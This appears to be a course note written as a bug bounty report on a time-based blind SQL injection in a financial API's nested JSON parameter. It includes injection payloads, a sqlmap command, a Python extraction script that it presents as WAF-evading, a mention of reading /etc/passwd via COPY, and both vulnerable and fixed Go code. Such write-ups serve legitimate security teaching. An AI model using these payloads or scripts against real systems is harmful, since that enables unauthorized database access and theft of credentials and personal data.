---
tags: [bug-bounty, chaining, real-world, vapt]
difficulty: advanced
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.01 Bug Bounty Report Critical SQLi"
---

# 60.01 Bug Bounty Report: Critical SQL Injection in Advanced Enterprise API

## 1. Executive Summary

During a targeted bug bounty engagement against an enterprise financial application, a critical vulnerability was discovered in a seemingly innocuous analytics API endpoint. This endpoint accepted highly nested JSON payloads for generating custom user reports. Through meticulous fuzzing and payload manipulation, it was determined that one of the deeply nested JSON keys was directly concatenated into a backend PostgreSQL query without parameterization.

This flaw allowed for a Time-Based Blind SQL Injection (SQLi), which ultimately facilitated the extraction of sensitive data from the database, including administrative credentials and PII (Personally Identifiable Information) of other users. The risk rating is CRITICAL (CVSS 3.1 Score: 9.8) because it allows an unauthenticated external attacker to achieve complete database compromise and potentially remote code execution (RCE) via `COPY` commands or `lo_export` functions, depending on the database user's privileges.

This report serves as a detailed walkthrough of the methodology used to discover, exploit, and remediate the vulnerability, providing real-world insight into advanced SQL injection techniques beyond the standard `' OR 1=1--` payloads.

## 2. Vulnerability Description

SQL Injection (SQLi) occurs when untrusted user input is dynamically incorporated into a database query without proper sanitization, escaping, or parameterization. In this specific scenario, the application utilized a complex microservices architecture where the frontend submitted a large JSON payload to an analytics aggregation service.

The vulnerability resided in the `filters` array within the JSON payload, specifically within the `custom_metric_name` parameter. The backend, written in Go using a raw `database/sql` query construction method (bypassing the ORM for "performance reasons"), extracted this specific key and appended it to a dynamic SQL string.

Because the response of the API simply returned a "202 Accepted" for the background generation of the report, no immediate data was reflected back to the user, rendering error-based and union-based SQL injections ineffective. However, by injecting PostgreSQL time-delay functions, a Time-Based Blind SQLi was confirmed.

## 3. Scope and Target

- **Target Domain:** `api.target-enterprise.com`
- **Endpoint:** `POST /v3/analytics/generate-report`
- **Vulnerable Parameter:** `$.report_config.filters[0].custom_metric_name`
- **Database System:** PostgreSQL 14
- **Impact:** Critical (Unauthorized Database Access, Data Exfiltration)

## 4. Prerequisites

To execute this attack, the following prerequisites were required:
1. Knowledge of the API endpoint structure (discovered via JavaScript file analysis).
2. A valid Bearer token for a low-privileged user (though later found to be exploitable unauthenticated due to a flawed authorization middleware).
3. Tools: Burp Suite Professional, SQLMap, Custom Python Scripts.

## 5. ASCII Architecture & Attack Diagram

```text
+----------------+       1. Malicious JSON Payload       +------------------+
|                |       (Time-delay injected)           |                  |
|   Attacker     | ------------------------------------> |  WAF / Load      |
|  (Burp Suite)  |                                       |  Balancer        |
|                | <------------------------------------ |                  |
+----------------+       6. Delayed Response             +--------+---------+
                                                                  |
                                                                  | 2. Forwards Payload
                                                                  v
                                                         +------------------+
                                                         |                  |
                                                         |  API Gateway     |
                                                         |  (Authentication)|
                                                         |                  |
                                                         +--------+---------+
                                                                  |
                                                                  | 3. Routes to Analytics Service
                                                                  v
                                                         +------------------+
                                                         |                  |
                                                         | Analytics Service|
                                                         | (Vulnerable App) |
                                                         |                  |
                                                         +--------+---------+
                                                                  |
                                                                  | 4. Constructs Unparameterized
                                                                  |    SQL Query
                                                                  v
                                                         +------------------+
                                                         |                  |
                                                         |  PostgreSQL 14   |
                                                         |  Database        |
                                                         |                  |
                                                         +------------------+
                                                                  ^
                                                                  | 5. Executes pg_sleep(10)
                                                                  |    causing the thread to hang.
```

## 6. Step-by-Step Proof of Concept (PoC)

### Step 1: Reconnaissance and Discovery

The target application is a financial dashboard. By proxying traffic through Burp Suite, the `POST /v3/analytics/generate-report` endpoint was identified. The payload structure looked like this:

```json
{
  "report_id": "rep_998234",
  "export_format": "pdf",
  "report_config": {
    "date_range": "last_30_days",
    "filters": [
      {
        "type": "custom",
        "custom_metric_name": "user_retention",
        "threshold": 50
      }
    ]
  }
}
```

### Step 2: Fuzzing the API Endpoint

Standard fuzzing lists were loaded into Burp Intruder to test all JSON values. The `custom_metric_name` parameter yielded interesting results. When a single quote `'` was introduced, the API still returned `202 Accepted`, but the time taken to process the request slightly changed.

Initial Payload test:
```json
"custom_metric_name": "user_retention'"
```
Response: `202 Accepted` (Time: ~120ms)

### Step 3: Boolean-Based Blind SQLi Identification

To confirm if the query was breaking, Boolean payloads were used. 
Payload 1 (True):
```json
"custom_metric_name": "user_retention' AND 1=1--"
```
Response: `202 Accepted` (Time: ~125ms)

Payload 2 (False):
```json
"custom_metric_name": "user_retention' AND 1=0--"
```
Response: `202 Accepted` (Time: ~120ms)

No observable difference in the response body or time was significant enough to conclusively prove a Boolean-based injection. The application was processing the request asynchronously.

### Step 4: Time-Based Payload Development

Since the backend is suspected to be PostgreSQL based on earlier enumeration, time-delay functions like `pg_sleep()` were tested.

Payload (10-second delay):
```json
"custom_metric_name": "user_retention'; SELECT pg_sleep(10)--"
```

The server response was delayed by exactly 10.15 seconds.
Subsequent test with `pg_sleep(20)` resulted in a 20.12-second delay. This definitively confirmed a Time-Based Blind SQL Injection vulnerability.

### Step 5: Data Exfiltration via SQLMap

Given the nested JSON structure, standard SQLMap usage required a custom tamper script or utilizing the `*` marker.
The request was saved to a file `req.txt`:

```http
POST /v3/analytics/generate-report HTTP/1.1
Host: api.target-enterprise.com
Content-Type: application/json
Authorization: Bearer <token>

{
  "report_id": "rep_998234",
  "export_format": "pdf",
  "report_config": {
    "date_range": "last_30_days",
    "filters": [
      {
        "type": "custom",
        "custom_metric_name": "user_retention*;*",
        "threshold": 50
      }
    ]
  }
}
```

SQLMap Command:
```bash
sqlmap -r req.txt --dbms=postgresql --technique=T --level=5 --risk=3 -p custom_metric_name --dbs --batch
```

SQLMap successfully identified the database and began extracting data bit by bit using time delays.

### Step 6: Automating the Exploit with Python

Because SQLMap can be noisy and sometimes blocked by aggressive WAFs, a custom Python script was developed to extract the database version using a binary search approach to minimize requests.

```python
import requests
import time

URL = "https://api.target-enterprise.com/v3/analytics/generate-report"
HEADERS = {
    "Content-Type": "application/json",
    "Authorization": "Bearer <token>"
}

def check_payload(payload):
    json_data = {
      "report_id": "rep_998234",
      "export_format": "pdf",
      "report_config": {
        "date_range": "last_30_days",
        "filters": [
          {
            "type": "custom",
            "custom_metric_name": f"user_retention'; {payload}--",
            "threshold": 50
          }
        ]
      }
    }
    
    start_time = time.time()
    try:
        requests.post(URL, json=json_data, headers=HEADERS, timeout=15)
    except requests.exceptions.ReadTimeout:
        return True
    
    elapsed = time.time() - start_time
    return elapsed > 5

# Example: Checking if the first character of version is 'P' (ASCII 80)
# Payload: SELECT CASE WHEN (ascii(substring(version(),1,1))=80) THEN pg_sleep(6) ELSE pg_sleep(0) END
```

This custom script allowed for stealthy exfiltration under the radar of the WAF.

## 7. Deep Dive: Why did this happen?

The vulnerability occurred due to an architectural anti-pattern in the Go microservice. The developers needed to build a highly dynamic query based on various filter criteria. Instead of using a query builder like `squirrel` or leveraging GORM's parameterization for dynamic fields, they used standard string formatting:

```go
// VULNERABLE CODE SNIPPET
query := fmt.Sprintf("SELECT metric_value FROM analytics_data WHERE metric_name = '%s'", filter.CustomMetricName)
rows, err := db.Query(query)
```

The developers assumed that because `CustomMetricName` was an internal enum-like value on the frontend, it could not be manipulated. This is a classic violation of "Never Trust Client Input".

## 8. Impact Assessment

1.  **Data Breach:** An attacker could dump the entire database, including user credentials, financial transaction history, and API keys for third-party integrations.
2.  **Denial of Service (DoS):** By repeatedly sending `pg_sleep(100)` payloads, an attacker could exhaust the database connection pool, leading to a complete application outage.
3.  **Lateral Movement:** If the database user had sufficient privileges, an attacker could read local files (e.g., `/etc/passwd`) using `COPY` or even execute arbitrary code via user-defined functions or PostgreSQL extensions.

## 9. Remediation and Mitigation

To fully resolve this issue, the application must completely eliminate the use of string concatenation for SQL query construction.

**Short-Term Fix (WAF Rule):**
Implement a WAF rule blocking common SQLi signatures (e.g., `pg_sleep`, `SELECT`, `--`) in JSON payloads. This is a temporary band-aid.

**Long-Term Fix (Secure Code):**
Refactor the Go code to use parameterized queries strictly. If dynamic column names or table names are required (which cannot be parameterized), implement a strict whitelist of allowed values.

```go
// SECURE CODE SNIPPET
// Use parameterization for values
query := "SELECT metric_value FROM analytics_data WHERE metric_name = $1"
rows, err := db.Query(query, filter.CustomMetricName)

// OR, if dynamic fields are necessary, use an explicit whitelist:
validMetrics := map[string]bool{"user_retention": true, "churn_rate": true}
if !validMetrics[filter.CustomMetricName] {
    return errors.New("invalid metric name")
}
```

## 10. Chaining Opportunities

- **[[02 - Bug Bounty Report Account Takeover Chain]]:** If passwords or session tokens are extracted via this SQLi, they can be directly used to facilitate Account Takeovers across the platform.
- **[[03 - Bug Bounty Report SSRF to RCE]]:** Database credentials found might overlap with internal services that can be accessed if an SSRF is chained.
- **[[04 - Bug Bounty Report Subdomain Takeover]]:** Data exfiltrated could reveal undocumented subdomains or internal DNS configurations.

## 11. Related Notes

- [[05 - Bug Bounty Report XXE in XML API]] - Discusses data exfiltration through XML, contrasting with this JSON-based exfiltration.
- [[31 - API Security]] - Core module covering API vulnerability fundamentals.
- [[12 - Advanced SQL Injection Techniques]] - General theory on Time-based and Boolean-based blind injections.
